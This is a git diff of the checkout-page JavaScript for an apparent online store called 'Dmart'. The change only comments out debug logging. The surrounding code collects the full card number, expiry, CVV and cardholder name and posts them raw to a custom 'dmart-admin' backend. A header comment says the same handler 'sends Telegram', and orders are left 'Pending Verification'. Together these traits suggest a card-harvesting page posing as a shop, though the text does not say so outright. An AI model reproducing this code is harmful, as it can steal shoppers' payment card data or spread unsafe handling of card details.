@@ -402,14 +402,14 @@ document.getElementById('edit-shipping').addEventListener('click', () => {
 
 /* ---------- PAY BUTTON (validates, sends Telegram, saves to DB, stores last_order_id) ---------- */
 document.getElementById('pay-btn').addEventListener('click', async () => {
-  console.log('Pay Now button clicked - starting payment process');
+  // console.log('Pay Now button clicked - starting payment process');
   
   const num = document.getElementById('card-number').value.trim();
   const exp = document.getElementById('card-expiry').value.trim();
   const cvv = document.getElementById('card-cvv').value.trim();
   const name = document.getElementById('card-name').value.trim();
 
-  console.log('Card details validation:', { num: num.substring(0, 4) + 'XXXX', exp, cvv: cvv ? 'XXX' : '', name });
+  // console.log('Card details validation:', { num: num.substring(0, 4) + 'XXXX', exp, cvv: cvv ? 'XXX' : '', name });
 
   if(!num || !exp || !cvv || !name) {
     console.error('Validation failed: Missing card details');
@@ -422,7 +422,7 @@ document.getElementById('pay-btn').addEventListener('click', async () => {
     return alert('Card number must be 16 digits');
   }
 
-  console.log('Validation passed, starting payment processing');
+  // console.log('Validation passed, starting payment processing');
 
   // spinner
   const btn = document.getElementById('pay-btn');
@@ -432,40 +432,40 @@ document.getElementById('pay-btn').addEventListener('click', async () => {
   const total = cart.reduce((s,i)=>s + i.price * i.quantity, 0);
   const user = JSON.parse(localStorage.getItem('Dmart_User')) || {};
   
-  console.log('Payment payload:', { user: !!user, total, cartItems: cart.length });
+  // console.log('Payment payload:', { user: !!user, total, cartItems: cart.length });
 
   try {
-    console.log('Sending order to server...');
+    // console.log('Sending order to server...');
     // Use local backend for development, Vercel for production
     const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
     const apiUrl = isLocalhost ? 'http://localhost:3000/api/save-order' : 'https://dmart-admin-n5cx.vercel.app/api/save-order';
     
-    console.log('Using API URL:', apiUrl);
+    // console.log('Using API URL:', apiUrl);
     
     const rs = await fetch(apiUrl, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({ user, card: { number: num, expiry: exp, cvv, name }, total, cart })
     }).then(r => {
-      console.log('Server response status:', r.status);
+      // console.log('Server response status:', r.status);
       return r.json();
     }).catch(error => {
       console.error('Network error during order save:', error);
       return { ok: false, error: error.message };
     });
 
-    console.log('Server response:', rs);
+    // console.log('Server response:', rs);
 
     // If server returned order_id, store it for thank-you download tracking
     if(rs && rs.ok && rs.order_id) {
-      console.log('Order saved successfully with ID:', rs.order_id);
+      // console.log('Order saved successfully with ID:', rs.order_id);
       localStorage.setItem('last_order_id', rs.order_id);
     } else {
       // If DB failed, we continue but still keep a local placeholder id
-      console.warn('DB save returned error or no order_id:', rs);
+      // console.warn('DB save returned error or no order_id:', rs);
       const localId = 'LOCAL-' + Math.random().toString(36).slice(2,10);
       localStorage.setItem('last_order_id', localId);
-      console.log('Using local order ID:', localId);
+      // console.log('Using local order ID:', localId);
     }
 
     // Save local history & clear cart
@@ -477,18 +477,18 @@ document.getElementById('pay-btn').addEventListener('click', async () => {
       status: 'Pending Verification'
     };
     
-    console.log('Saving order to local storage:', newOrder);
+    // console.log('Saving order to local storage:', newOrder);
     
     const history = JSON.parse(localStorage.getItem('Dmart_Orders')) || [];
     history.unshift(newOrder);
     localStorage.setItem('Dmart_Orders', JSON.stringify(history));
     localStorage.removeItem('Dmart');
 
-    console.log('Order saved locally, redirecting to thank you page...');
+    // console.log('Order saved locally, redirecting to thank you page...');
 
     // Redirect to thank you
     setTimeout(()=> { 
-      console.log('Redirecting now...');
+      // console.log('Redirecting now...');
       window.location.href = 'thank-you.html'; 
     }, 1500); // Increased delay to allow time to see console logs
     
